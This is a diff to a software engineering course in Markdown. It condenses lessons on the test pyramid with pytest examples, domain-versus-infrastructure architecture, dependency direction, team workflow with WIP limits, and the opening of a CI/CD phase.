-# The unit under test: deliberately structured so the business
-# logic is pure and the I/O sits at the edges. This is what makes
-# the fast layer of the pyramid possible at all.
-# ---------------------------------------------------------------
 from dataclasses import dataclass
 
 @dataclass(frozen=True)
@@ -15973,209 +12954,51 @@ class Order:
     country: str
 
 def calculate_total(order: Order) -> int:
-    """Pure function: no clock, no database, no network. Trivially testable."""
+    """Pure domain: no clock, no DB, no network — trivially unit-testable."""
     if not 0 <= order.discount_percent <= 100:
         raise ValueError("discount must be between 0 and 100")
-    percent = min(order.discount_percent, 50)          # capped
+    percent = min(order.discount_percent, 50)
     discounted = order.subtotal_cents * (100 - percent) // 100
     vat = {"GB": 20, "DE": 19, "US": 0}.get(order.country, 0)
     return discounted + discounted * vat // 100
 
-# ===============================================================
-# LEVEL 1: UNIT -- many, fast, precise. Arrange / Act / Assert.
-# ===============================================================
-import pytest
-
-def test_no_discount_no_vat():
-    assert calculate_total(Order(10_000, 0, "US")) == 10_000
-
-def test_discount_applied():
-    assert calculate_total(Order(10_000, 10, "US")) == 9_000
-
-def test_vat_applied_after_discount():
-    # 10000 -> 9000 discounted -> +20% VAT -> 10800
+# --- UNIT (many) ---
+def test_vat_after_discount():
     assert calculate_total(Order(10_000, 10, "GB")) == 10_800
 
-@pytest.mark.parametrize("percent,expected", [
-    (0,   10_000),
-    (49,   5_100),
-    (50,   5_000),   # exactly at the cap -- the boundary itself
-    (51,   5_000),   # above the cap, must clamp
-    (100,  5_000),
-])
-def test_discount_cap_boundary(percent, expected):
-    # Boundaries are where bugs live, and where mutation testing
-    # will otherwise report a surviving mutant.
-    assert calculate_total(Order(10_000, percent, "US")) == expected
+def test_discount_cap_boundary():
+    assert calculate_total(Order(10_000, 50, "US")) == 5_000
+    assert calculate_total(Order(10_000, 51, "US")) == 5_000
 
-def test_rejects_impossible_discount():
-    with pytest.raises(ValueError, match="between 0 and 100"):
-        calculate_total(Order(10_000, 101, "US"))
+# --- INTEGRATION (some): real DB constraint, not a mock ---
+# INSERT negative subtotal → CheckViolation only a real Postgres catches
 
-# ===============================================================
-# PROPERTY-BASED -- state an invariant, let the tool find inputs
-# no human would have chosen.
-# ===============================================================
-from hypothesis import given, strategies as st
+# --- E2E (few): Playwright on critical path ---
+# click Checkout → see "Order confirmed" by role/text, not CSS class
 
-@given(
-    subtotal=st.integers(min_value=0, max_value=10**9),
-    percent=st.integers(min_value=0, max_value=100),
-    country=st.sampled_from(["GB", "DE", "US", "FR"]),
-)
-def test_total_is_never_negative_and_never_exceeds_subtotal_plus_vat(
-    subtotal, percent, country
-):
-    total = calculate_total(Order(subtotal, percent, country))
-    assert total >= 0
-    assert total <= subtotal + subtotal * 20 // 100
-# Hypothesis will try 0, 1, huge values, and shrink any failure to
-# the smallest input that still breaks. It routinely finds the
-# integer-division edge cases a human test author skips.
-
-# ===============================================================
-# LEVEL 2: INTEGRATION -- a REAL database, not a mock of one.
-# testcontainers makes this cheap enough that mocking your own
-# database is now usually the wrong call.
-# ===============================================================
-import psycopg
-from testcontainers.postgres import PostgresContainer
-
-@pytest.fixture(scope="session")
-def pg():
-    with PostgresContainer("postgres:16") as container:
-        with psycopg.connect(container.get_connection_url()) as conn:
-            conn.execute("""
-                CREATE TABLE orders (
-                    id SERIAL PRIMARY KEY,
-                    subtotal_cents INT NOT NULL CHECK (subtotal_cents >= 0),
-                    total_cents    INT NOT NULL,
-                    country        TEXT NOT NULL
-                )""")
-            conn.commit()
-            yield conn
-
-@pytest.fixture(autouse=True)
-def clean(pg):
-    # Independence: every test starts from the same known state, so
-    # any subset can run in any order, which is what allows -n auto.
-    yield
-    pg.execute("TRUNCATE orders RESTART IDENTITY")
-    pg.commit()
-
-def test_order_round_trips_through_real_sql(pg):
-    order = Order(10_000, 10, "GB")
-    pg.execute(
-        "INSERT INTO orders (subtotal_cents, total_cents, country) VALUES (%s,%s,%s)",
-        (order.subtotal_cents, calculate_total(order), order.country),
-    )
-    pg.commit()
-    row = pg.execute("SELECT total_cents, country FROM orders").fetchone()
-    assert row == (10_800, "GB")
-
-def test_database_constraint_actually_exists(pg):
-    # A unit test cannot catch this. The constraint lives in the schema,
-    # and only a real database will enforce it.
-    with pytest.raises(psycopg.errors.CheckViolation):
-        pg.execute("INSERT INTO orders VALUES (DEFAULT, -1, 0, 'GB')")
-
-# ===============================================================
-# MOCKING, done only at a boundary we do not own
-# ===============================================================
-from unittest.mock import Mock
-
-def checkout(order, payment_gateway, notifier):
-    total = calculate_total(order)
-    receipt = payment_gateway.charge(cents=total, currency="GBP")
-    notifier.send(f"Paid {total}, ref {receipt.id}")
-    return receipt.id
-
-def test_checkout_charges_the_calculated_total():
-    # The payment provider is external, costs money, and cannot run
-    # in CI, so it is mocked. Our own logic is NOT mocked.
-    gateway = Mock()
-    gateway.charge.return_value = Mock(id="ch_123")
-    notifier = Mock()
-
-    ref = checkout(Order(10_000, 10, "GB"), gateway, notifier)
-
-    assert ref == "ch_123"
-    gateway.charge.assert_called_once_with(cents=10_800, currency="GBP")
-    # This assertion is coupled to the gateway's signature, which is
-    # exactly why a scheduled CONTRACT TEST against the real sandbox
-    # is required. Otherwise a provider rename passes here forever.
-
-# ===============================================================
-# LEVEL 3: END TO END -- few, slow, and only the critical paths
-# ===============================================================
-from playwright.sync_api import Page, expect
-
-def test_a_user_can_complete_checkout(page: Page):
-    page.goto("http://localhost:8000/cart")
-    page.get_by_role("button", name="Checkout").click()
-    page.get_by_label("Card number").fill("4242424242424242")
-    page.get_by_role("button", name="Pay").click()
-    # Assert on user-visible outcomes and roles, not CSS classes:
-    # class names change constantly and are the main source of flake.
-    expect(page.get_by_text("Order confirmed")).to_be_visible(timeout=10_000)
-    expect(page.get_by_text("Total: 108.00")).to_be_visible()
-# One or two of these, not fifty. They verify that the wiring,
-# configuration, and deployment are correct -- things no lower
-# layer can see -- and they pay for it in runtime and flake.
+# --- MOCK only at unpaid boundary ---
+# payment_gateway.charge(...) asserted; own calculate_total NOT mocked
 ```
 
-```bash
-# Run the layers separately, which is what makes the fast loop fast.
-pytest tests/unit -q                      # every file save, ~2 seconds
-pytest tests/integration -q               # before every push
-pytest tests/e2e -q                       # in CI, on the branch
+| Layer | Catches | Blind to | Maintenance |
+| ----- | ------- | -------- | ----------- |
+| Unit | Logic, edges, off-by-one | Wiring, real I/O | Low if behaviour-focused |
+| Integration | Schema, transactions, serialization | Full browser journeys | Needs real deps |
+| E2E | Config, deploy, full paths | Precise localization of fault | Highest flake risk |
 
-pytest -n auto                            # parallel: only works because
-                                          # tests are independent
-pytest --cov=src --cov-branch --cov-report=html
-                                          # BRANCH coverage, not line
-pytest -p no:randomly --lf                # rerun only last failures
-pytest --randomly-seed=12345              # detect order dependence
+Flaky tests train teams to ignore red builds — fix or delete. Independence (any subset, any order) enables parallel runs and keeps the fast loop honest.
 
-# The measurement that actually matters. Expect to be humbled.
-mutmut run && mutmut results
-mutmut show <id>                          # see the surviving mutant
+**PRACTICE:**
 
-# Find flaky tests before they train your team to ignore failures:
-pytest --count=20 tests/integration       # via pytest-repeat
-```
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Write three unit tests with clear arrange/act/assert; explain why an inverted pyramid gets ignored |
+| Medium | Parameterize boundaries for a function with ≥2 conditionals; replace a mocked DB with a containerized real one (or sketch the fixture) |
+| Hard | Add one property-based invariant (Hypothesis-style) and one Playwright-style E2E that asserts on roles/text; name three structure-coupled tests you would rewrite |
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+**WHAT THIS UNLOCKS NEXT:**
 
-"How would you test this feature" expects you to name what belongs at each layer - pure business logic as unit tests, "does the API and database work together" as integration tests, and "does the checkout flow work end to end" as one or two E2E tests, not fifty. The most common follow-up is "what is the difference between a mock and a stub," where the expected distinction is asserting on interactions versus supplying canned data, and the strong answer continues to *when each is appropriate*. Expect "is 100 percent coverage a good goal," which is a deliberate trap: the correct answer explains that coverage measures execution rather than assertion, that a suite with no assertions can reach 100 percent, and that branch coverage plus mutation testing measure something closer to what you actually want. Expect "what do you do about a flaky test," where the only defensible answers are fix it or delete it, because quarantining it indefinitely trains people to ignore red builds. Also common: "how do you test code that depends on the current time or on randomness," where injecting the clock or the seed is the answer and is a nice demonstration of dependency inversion from Phase 33.2. A senior-level version asks "your test suite takes 40 minutes and people have stopped running it, what do you do," and the expected reasoning is to measure the distribution, find the inverted pyramid, parallelise, and move assertions down to the cheapest layer that can make them.
-
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                                          |
-| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Write three unit tests for a pure function of your own, one per arrange-act-assert phase being clearly separated                                                                                              |
-| Easy       | Take the `apply_discount` example above and write the test that kills the surviving `>=` mutant                                                                                                               |
-| Easy       | Run a coverage report with branch coverage enabled on an existing project and name one branch that never executes                                                                                             |
-| Easy       | Explain in three sentences why an inverted pyramid, mostly end-to-end tests, produces a suite people stop running                                                                                             |
-| Easy       | Classify five tests in any project you have as unit, integration, or end-to-end, and justify each                                                                                                             |
-| Medium     | Write parameterized tests covering every boundary of a function with at least two conditionals, including both sides of each                                                                                  |
-| Medium     | Add Hypothesis to a project and write one property-based test. Report the input it found that your example-based tests missed                                                                                 |
-| Medium     | Replace a mocked database in an existing test with a real one using testcontainers, then find one bug the mock was hiding                                                                                     |
-| Medium     | Run [mutmut](https://github.com/boxed/mutmut) or [Stryker](https://stryker-mutator.io/) against a suite you consider good, then report the mutation score and fix three survivors                             |
-| Medium     | Take a function that reads the current time directly and refactor it so the clock is injected, then test behaviour at a specific timestamp                                                                    |
-| Medium     | Write one end-to-end test with Playwright that asserts on roles and visible text rather than CSS selectors, and explain why that reduces flake                                                                |
-| Medium     | Run your suite with `pytest -p randomly` and fix any test that fails only in a particular order                                                                                                               |
-| Hard       | Do the Gilded Rose kata: write a characterisation test suite for code you did not write, get to full branch coverage, then refactor safely                                                                    |
-| Hard       | Take a suite tightly coupled to class structure and rewrite it to test behaviour through public interfaces only, then prove the point by restructuring the implementation without editing a test              |
-| Hard       | Build a complete pyramid for a small service: 50 unit, 10 integration against a containerised database, 2 end-to-end, and report the runtime of each layer                                                    |
-| Hard       | Add a contract test against a third-party sandbox API, then deliberately change your mock to disagree with it and show which test catches the drift                                                           |
-| Hard       | Take a suite that runs in 20 minutes and get it under 2 without deleting coverage. Document every technique used and its individual contribution                                                              |
-| Hard       | Implement TDD strictly for one real feature: no production line written before a failing test. Then write down what the discipline changed about your design                                                  |
-| Hard       | Watch [TDD, Where Did It All Go Wrong](https://www.youtube.com/watch?v=EZ05e7EMOLM) and audit your own suite against its central claim, listing every test that is coupled to structure rather than behaviour |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - SOFTWARE ARCHITECTURE:** Tests only stay cheap to write when the code underneath is organized so business rules can be exercised without spinning up a database or a web server. That organization - keeping policy independent of frameworks and I/O - is Phase 75.
+Tests stay cheap only when business rules can run without spinning up a database or a web server. Keeping policy independent of frameworks and I/O — application architecture, lifting Phase 29’s object-scale lesson — is Phase 75.
 
 ---
 
@@ -16183,71 +13006,57 @@ pytest --count=20 tests/integration       # via pytest-repeat
 
 ---
 
-
-
 # PHASE 75 - Software Architecture
 
 **Track:** Professional Software Engineering
 
-**WHAT YOU WILL BE ABLE TO DO:** Keep policy independent of frameworks and I/O - separate domain logic from adapters so tests and swaps stay cheap.
+**WHAT YOU WILL BE ABLE TO DO:** Keep policy independent of frameworks and I/O — separate domain logic from adapters so tests and swaps stay cheap.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 74 (tests stay cheap when domain can run without a real database or web server). **Phase 29** (you already drew domain vs infrastructure and dependency direction at *object / LLD* scale).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 74 — tests stay cheap when domain can run without a real database or web server. **Phase 29** — you already drew domain vs infrastructure and dependency direction at *object / LLD* scale.
 
-> **Bridge from Phase 29:** In Story IV you practiced the same two ideas on a whiteboard for one feature: which classes hold business rules vs plumbing, and which way imports may point. Phase 75 does **not** reteach OOP. It lifts that object-level design into **application architecture**: the same domain/infra split and inward dependency rule, now across packages, deployable services, and framework boundaries. If Phase 29 felt like "draw the parking lot," this phase is "keep the whole product's rules out of Flask and SQLAlchemy."
+> **Bridge from Phase 29:** In Story IV you practiced the same two ideas on a whiteboard for one feature: which classes hold business rules vs plumbing, and which way imports may point. Phase 75 does **not** reteach OOP. It lifts that object-level design into **application architecture**: the same domain/infra split and inward dependency rule, now across packages, deployable services, and framework boundaries. If Phase 29 felt like “draw the parking lot,” this phase is “keep the whole product’s rules out of Flask and SQLAlchemy.”
+
+**LEARNING RESOURCES:**
+
+- [The Clean Architecture (Uncle Bob)](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)
+- [cosmicpython/book](https://github.com/cosmicpython/book) — layered Python example
+- [Martin Fowler — Presentation Domain Data Layering](https://martinfowler.com/bliki/PresentationDomainDataLayering.html)
+- [Hexagonal architecture primer](https://alistair.cockburn.us/hexagonal-architecture/)
 
 ## 75.1 Domain vs Infrastructure
 
-**WHY YOU ARE LEARNING THIS:** **Domain** code expresses business rules (orders, fees, eligibility). **Infrastructure** talks to the world (SQL, HTTP, SMTP). Mixing them makes rules untestable and frameworks hard to swap. You met this vocabulary in Phase 29.3; here the unit of design is the *application*, not a single class diagram.
+Phase 74’s fast unit layer assumed something important: `calculate_total` imported nothing from Flask or Postgres. That was not an accident — it was architecture. **Domain** code expresses business rules (orders, fees, eligibility). **Infrastructure** talks to the world (SQL, HTTP, SMTP). Mixing them makes rules untestable and frameworks hard to swap. You met this vocabulary in Phase 29; here the unit of design is the *application*, not a single class diagram.
 
-**THE PROBLEM THIS SOLVES:** Flask request handlers compute tax, send email, and build SQL strings - changing web framework rewrites business logic.
+**THE FAILURE MODE:**
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- Core essay: [The Clean Architecture (Uncle Bob)](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html) *(Composio web + fetch)*; compare hexagonal / ports-and-adapters
-- [cosmicpython/book](https://github.com/cosmicpython/book) - canonical layered example
-- [Martin Fowler - Presentation Domain Data Layering](https://martinfowler.com/bliki/PresentationDomainDataLayering.html)
-- [Alex Hyett - SOLID / layering mindset](https://www.youtube.com/watch?v=kF7rQmSRlq0)
-- [prasadgujar/low-level-design-primer](https://github.com/prasadgujar/low-level-design-primer)
-- Split a Flask route into handler + service + repo
-
-**STEP-BY-STEP EXPLANATION**
-
-**Domain layer**: entities, value objects, domain services, no imports from Flask/SQLAlchemy. **Application layer**: use cases orchestrate domain + ports. **Infrastructure**: implements repositories, controllers, CLI.
-
-"Clean-ish" acknowledges pragmatism - small scripts skip layers; products that live years earn them.
-
-**THE MAIN IDEA IN SIMPLE WORDS:** Business rules in the center; adapters on the outside.
-
-**WHAT HAPPENS INSIDE, ONE STEP AT A TIME**
-
-```mermaid
-flowchart TD
-    H["HTTP controller"] --> A["Application service"]
-    A --> D["Domain"]
-    A --> P["Repository port"]
-    I["Postgres adapter"] -. implements .-> P
+```text
+@app.post("/checkout")
+def checkout():
+    # tax math + SQL string + SMTP send all in one handler
+    # swap Flask → rewrite business rules
+    # unit-test tax → need a fake HTTP stack
 ```
 
+**LAYERS (PRAGMATIC “CLEAN-ISH”):**
 
+| Layer | Owns | Must not own |
+| ----- | ---- | ------------ |
+| **Domain** | Entities, value objects, domain services | Flask, SQLAlchemy, status codes |
+| **Application** | Use cases; orchestrates domain + ports | Vendor SQL dialects, raw sockets |
+| **Infrastructure** | Repositories, controllers, CLI, mailers | Business policy (keep it thin) |
 
-**PICTURE IT LIKE THIS**
+Small scripts skip layers; products that live years earn them. Microservices on day one without clear domains become a distributed monolith.
 
-Restaurant: recipes (domain) vs kitchen equipment brand (infra). Recipes survive if you switch gas to induction.
+```text
+HTTP controller  →  Application service  →  Domain
+                         │
+                         └→ Repository port  ←implements─  Postgres adapter
+```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Choice                 | What it buys                   | What it costs                           |
-| ---------------------- | ------------------------------ | --------------------------------------- |
-| Layered/domain-centric | Testable core; swappable infra | More modules; upfront discipline        |
-| Framework-first        | Fast scaffold                  | Rules trapped in controllers            |
-| Microservices day one  | Isolation                      | Distributed monolith if domains unclear |
-
-
-**SMALL WORKING EXAMPLE**
+Restaurant analogy: recipes (domain) survive when you swap the stove brand (infra).
 
 ```python
-# domain.py - no I/O imports
+# domain.py — no I/O imports
 class Account:
     def __init__(self, balance: float):
         if balance < 0:
@@ -16269,7 +13078,7 @@ class BankingService:
         acct.withdraw(amount)
         self.repo.save(acct_id, acct)
 
-# infra fake
+# infra fake — swap for Postgres adapter later without touching Account
 class MemoryRepo:
     def __init__(self):
         self.db = {"A1": Account(100)}
@@ -16285,78 +13094,50 @@ svc.cash_out("A1", 30)
 print(svc.repo.load("A1")._balance)
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+| Choice | Buys | Costs |
+| ------ | ---- | ----- |
+| Domain-centric layers | Testable core; swappable infra | More modules; discipline |
+| Framework-first | Fast scaffold | Rules trapped in controllers |
+| Microservices day one | Isolation fantasy | Network + unclear domains |
 
-Draw circles: entities inside, adapters outside. Mention cosmicpython as study project.
+**PRACTICE:**
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | List what belongs in domain vs infra for a library checkout feature |
+| Medium | Extract domain from a bloated controller sketch (handler + service + repo) |
+| Hard | Decide where validation lives (HTTP edge vs domain invariant) and justify with a failing test story |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-| Difficulty | Task                                         |
-| ---------- | -------------------------------------------- |
-| Easy       | List what belongs in domain for library LLD  |
-| Medium     | Extract domain from bloated controller       |
-| Hard       | Where does validation live - edge vs domain? |
+Separating layers is only half the rule. Source dependencies must point **inward** — infrastructure depends on domain ports, never the reverse. That enforcement is 75.2.
 
-
-**WHY THE NEXT TOPIC IS NEEDED:** Dependency direction enforces which layer may import which.
+---
 
 ## 75.2 Dependency Direction
 
-**WHY YOU ARE LEARNING THIS:** Source code dependencies should point **inward**: infrastructure depends on domain interfaces, never the reverse.
+A clean folder tree still fails if `domain/order.py` imports `sqlalchemy`. The **dependency rule**: inner layers define interfaces (ports); outer layers implement them (adapters). Domain never mentions HTTP status codes. Controllers translate HTTP ↔ DTOs ↔ domain commands.
 
-**THE PROBLEM THIS SOLVES:** Domain imports `sqlalchemy` models - business rules now require ORM migrations to compile.
-
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- [cosmicpython/book](https://github.com/cosmicpython/book)
-- [DigitalOcean - SOLID (DIP)](https://www.digitalocean.com/community/tutorials/s-o-l-i-d-the-first-five-principles-of-object-oriented-design)
-- [AlgoMaster SOLID](https://blog.algomaster.io/p/solid-principles-explained-with-code)
-- [kumaransg/LLD](https://github.com/kumaransg/LLD)
-- Draw forbidden import arrows for a sample project tree
-
-**STEP-BY-STEP EXPLANATION**
-
-**Dependency rule**: inner layers define interfaces; outer layers implement them. Domain never mentions HTTP status codes. Controllers translate HTTP <-> DTOs <-> domain commands.
-
-Violations to spot: domain importing Flask, entities inheriting ORM base classes (common leak - isolate with mappers).
-
-**THE MAIN IDEA IN SIMPLE WORDS:** Depend inward on abstractions; adapters implement those abstractions outward.
-
-**WHAT HAPPENS INSIDE, ONE STEP AT A TIME**
+**ALLOWED VS FORBIDDEN:**
 
 ```text
 ALLOWED:
-  infra -> domain
-  infra -> application
+  infra → application → domain
+  infra → domain (via port interfaces)
 
 FORBIDDEN:
-  domain -> infra
-  domain -> flask
+  domain → infra
+  domain → flask / django / sqlalchemy base models
 ```
 
-**PICTURE IT LIKE THIS**
-
-City ordinance vs construction company: laws don't reference a builder's toolbox brand.
-
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Choice                       | What it buys                   | What it costs                      |
-| ---------------------------- | ------------------------------ | ---------------------------------- |
-| Strict dependency rule       | Portable domain; clearer tests | Mapping boilerplate DTO <-> entity |
-| ORM-active record everywhere | Less mapping                   | DB schema drives model; rules leak |
-| Shared utils grab-bag        | Quick helpers                  | Hidden coupling across layers      |
-
-
-**SMALL WORKING EXAMPLE**
+Common leak: entities inheriting ORM base classes so the schema *is* the model. Isolate with mappers: ORM row ↔ domain entity at the boundary.
 
 ```python
-# port defined near domain
+# port near domain
 class UserStore:
     def get(self, user_id: str) -> dict: ...
 
-# adapter in infra file (conceptually separate)
+# adapter in infra
 class InMemoryUserStore(UserStore):
     def __init__(self):
         self.data = {"u1": {"name": "Ada"}}
@@ -16372,23 +13153,19 @@ class GreetingPolicy:
 print(GreetingPolicy().greet(InMemoryUserStore(), "u1"))
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+City ordinance vs construction company: laws do not reference a builder’s toolbox brand. ORM-active-record everywhere buys less mapping and sells “DB schema drives the model.” Shared utils grab-bags hide coupling across layers.
 
-Architecture interview: label arrows on diagram. Fix one backward dependency aloud.
+**PRACTICE:**
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Name three forbidden imports in a domain package |
+| Medium | Sketch a mapper from ORM row → domain entity for `Order` |
+| Hard | Trade-offs of anemic domain model vs rich entities for the bookstore |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-| Difficulty | Task                                               |
-| ---------- | -------------------------------------------------- |
-| Easy       | Name three forbidden imports in domain layer       |
-| Medium     | Mapper from ORM row to domain entity sketch        |
-| Hard       | Trade-offs of anemic domain model vs rich entities |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Development Process:** Clean layers tell you *where* code belongs. They do not tell a team *how* work moves from idea to production - who prioritizes, what "ready" means, which gates exist. That workflow is Phase 76.
-
-**CHECK YOUR UNDERSTANDING AFTER PHASE 75:** Sketch domain vs infra for one app and mark allowed dependency arrows.
+Clean layers tell you *where* code belongs. They do not tell a team *how* work moves from idea to production — who prioritizes, what “ready” means, which gates exist. That workflow is Phase 76.
 
 ---
 
@@ -16396,48 +13173,61 @@ Architecture interview: label arrows on diagram. Fix one backward dependency alo
 
 ---
 
-
-
 # PHASE 76 - Development Process
 
 **Track:** Professional Software Engineering
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain a team's delivery workflow (backlog → ready → in progress → review → done) and why each gate exists - without pretending one ceremony fits every team.
+**WHAT YOU WILL BE ABLE TO DO:** Explain a team’s delivery workflow (backlog → ready → in progress → review → done) and why each gate exists — without pretending one ceremony fits every team.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 75 (architecture boundaries), Phase 73 (specs and acceptance criteria feed the backlog), Phase 72 (PRs are a process gate, not only a Git command).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 75 — architecture boundaries. Phase 73 — specs and acceptance criteria feed the backlog. Phase 72 — PRs are a process gate, not only a Git command.
+
+**LEARNING RESOURCES:**
+
+- [Scrum vs Kanban (Development That Pays)](https://www.youtube.com/watch?v=rIaz-l1Kf8w)
+- [The Twelve-Factor App](https://12factor.net/) — habits that survive cloud deploys
+- [Agile Manifesto principles](https://agilemanifesto.org/principles.html) — skim, then compare to how your last project *actually* worked
+- [Kanban WIP limits (Atlassian)](https://www.atlassian.com/agile/kanban/wip-limits)
 
 ## 76.1 Shipping Predictably
 
-**WHY YOU ARE LEARNING THIS:** Brilliant code still ships late when work is invisible, oversized, or blocked without a named owner. Process is not bureaucracy for its own sake - it is a shared map of *how unfinished work becomes finished work*, so the team can spot stuck items and improve the system instead of blaming individuals.
+Brilliant architecture still ships late when work is invisible, oversized, or blocked without a named owner. Process is not bureaucracy for its own sake — it is a shared map of *how unfinished work becomes finished work*, so the team can spot stuck items and improve the system instead of blaming individuals.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**GATES (NAMES VARY):**
 
-- Comparison: [Scrum vs Kanban (Development That Pays)](https://www.youtube.com/watch?v=rIaz-l1Kf8w) *(Composio YouTube)*
-- Written: [The Twelve-Factor App](https://12factor.net/) *(Composio fetch)* - process habits that survive cloud deploys; agile manifesto principles (individuals/interactions, working software, customer collaboration, responding to change)
-- Practice: draw your last project's actual workflow (not the aspirational one) and mark where work waited
+| State | Purpose of the gate |
+| ----- | ------------------- |
+| **Backlog** | Ordered ideas; only the top is refined |
+| **Ready** | Has acceptance criteria (Phase 73), owner, size small enough to finish soon |
+| **In progress** | WIP limits stop multitasking from faking progress |
+| **Review** | Code review (Phase 72) + product acceptance against criteria |
+| **Done** | Definition of done: tests, notes, deployability, no secrets committed — not “merged somehow” |
 
-**STEP-BY-STEP EXPLANATION**
-
-Common building blocks (names vary):
-
-1. **Backlog** - ordered ideas; only the top is refined.
-2. **Ready** - has acceptance criteria, owner, and size small enough to finish soon.
-3. **In progress** - WIP limits exist so multitasking does not fake progress.
-4. **Review** - code review + product acceptance against the criteria from Phase 73.
-5. **Done** - definition of done includes tests, docs/notes, deployability, and "no secrets committed" - not "merged somehow."
-
-**Scrum** time-boxes planning/review/retro. **Kanban** optimizes flow and WIP. Most healthy teams borrow: small batches, visible work, frequent feedback, retrospectives that change the process.
+**Scrum** time-boxes planning/review/retro. **Kanban** optimizes flow and WIP. Healthy teams borrow: small batches, visible work, frequent feedback, retrospectives that change the process.
 
 ```text
-Bad process smell          What it usually means
-------------------         ----------------------
-Everything is "urgent"     No prioritization / no capacity
-Tickets stay "90% done"    No definition of done / oversized stories
-Review queue forever       Reviews not scheduled; PR size too big
-Heroics every release      Missing automation (Phase 77+) or missing DoD
+Bad smell                    Usually means
+-------------------------    ----------------------------------
+Everything is "urgent"       No prioritization / no capacity
+Tickets stay "90% done"      No DoD / oversized stories
+Review queue forever         Reviews unscheduled; PRs too big
+Heroics every release        Missing automation (77+) or missing DoD
+Context-switch soup          WIP limit ignored; five half-done slices
 ```
 
-**SMALL WORKING EXAMPLE**
+**WIP IS A FORCE MULTIPLIER:**
+
+Starting ticket #6 while five are “almost done” increases cycle time for *all* of them. Finishing one unlocks review capacity and clears the board. The playground below encodes that as a hard gate — the same idea as a physical kanban column with two slots.
+
+**DEFINITION OF DONE (EXAMPLE FOR A STUDENT BOOKSTORE SLICE):**
+
+```text
+[ ] Acceptance criteria from the ticket all pass (manual or automated)
+[ ] Unit tests for new domain behaviour; failure path covered
+[ ] PR reviewed; blocking comments resolved
+[ ] No secrets in the diff; config via env at runtime (Phase 78 preview)
+[ ] Deployable from main (or documented why not yet)
+[ ] One-line note for the next engineer (what surprised you)
+```
 
 ```python playground=cs-phase-76-wip-limit
 # Toy board: enforce a WIP limit of 2 "in_progress" items.
@@ -16462,8 +13252,7 @@ def start(ticket_id):
             return
     print(f"NO-OP {ticket_id}")
 
-start("A")  # blocked - already at limit
-# Finish one, then start
+start("A")  # blocked — already at limit
 for t in board:
     if t["id"] == "B":
         t["state"] = "done"
@@ -16471,15 +13260,27 @@ start("A")
 print(board)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**BOOKSTORE SPRINT SKETCH:**
+
+```text
+Mon: refine top 3 backlog items into mini-specs (Phase 73)
+Tue–Wed: WIP≤2; Ada on badge API, Sam on UI — both Ready→In progress→Review
+Thu: review gate; squash-merge small PRs (Phase 72)
+Fri: demo against acceptance; retro changes WIP or DoD if reviews stalled
+Manual "run tests then FTP to server" still hurts → Phase 77 automates the path
+```
+
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Name five workflow states and one purpose for each gate |
 | Medium | Write a one-paragraph Definition of Done for a student project |
-| Hard | Compare Scrum and Kanban for a 3-person team shipping weekly; pick and justify |
+| Hard | Compare Scrum vs Kanban for a 3-person team shipping weekly; pick and justify with WIP and review-queue risks |
 
-**WHY THE NEXT TOPIC IS NEEDED - CI/CD:** Manual "run the tests on my laptop then copy files to the server" does not scale and is not repeatable. Automating build, test, and deploy gates is Phase 77.
+**WHAT THIS UNLOCKS NEXT:**
+
+Manual “run the tests on my laptop then copy files to the server” does not scale and is not repeatable. Automating build, test, and deploy gates is Phase 77.
 
 ---
 
@@ -16487,493 +13288,153 @@ print(board)
 
 ---
 
-
 # PHASE 77 - CI/CD
 
 **Track:** Professional Software Engineering
 
-**WHAT YOU WILL BE ABLE TO DO:** Automate the path to production - explain what each pipeline stage (lint, test, build, deploy) would catch if it failed.
+**WHAT YOU WILL BE ABLE TO DO:** Automate the path to production — explain what each pipeline stage (lint, test, build, deploy) would catch if it failed.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 76 (process gates become machine-checkable), Phase 74 (the test suite is what CI actually runs), Phase 72 (pipelines usually trigger on branches and PRs).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 76 — process gates become machine-checkable. Phase 74 — the test suite is what CI actually runs. Phase 72 — pipelines usually trigger on branches and PRs.
+
+**LEARNING RESOURCES:**
+
+- [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions)
+- [CI/CD In 5 Minutes (Fireship)](https://www.youtube.com/watch?v=42UP1fxi2SY) · [IBM — What is CI/CD?](https://www.youtube.com/watch?v=scEDHsr3APg)
+- [Continuous Delivery vs Continuous Deployment (Dave Farley)](https://www.youtube.com/watch?v=7SNbDWob6cI)
+- [DORA research / quick check](https://dora.dev/research/) · [Google SRE — Release engineering](https://sre.google/sre-book/release-engineering/)
+- [nektos/act](https://github.com/nektos/act) — run workflows locally
 
 ## 77.1 CI/CD (Continuous Integration & Continuous Deployment)
 
